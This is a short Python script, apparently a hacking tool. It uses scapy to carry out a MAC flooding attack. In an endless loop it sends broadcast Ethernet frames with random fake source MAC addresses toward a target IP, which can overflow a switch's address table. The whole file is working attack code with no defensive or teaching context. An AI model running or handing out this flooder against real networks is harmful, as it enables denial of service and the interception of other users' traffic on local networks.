import sys
from scapy.all import *
import random
import time

def generateMac():
    return ":".join("%02x" % random.randint(0, 255) for _ in range(6))

def macFload(interface, dst_IP):
    while True:
        fake_mac = generateMac()
        ethernet_frame = Ether(src = fake_mac, dst = "ff:ff:ff:ff:ff:ff") / IP(dst = dst_IP) / ICMP()
        sendp(ethernet_frame, iface = interface, verbose = False)
        print(f"[-->] SEND fake MAC\n-- { fake_mac } to { dst_IP } --\n")

        time.sleep(0.01)

def main():
    interface = sys.argv[1]
    router_IP = sys.argv[2]

    try:
        print("===- MAC FLOOFING -===")
        macFload(interface, router_IP)
    except KeyboardInterrupt:
        print("===- STOPPED -===")
        quit()


main()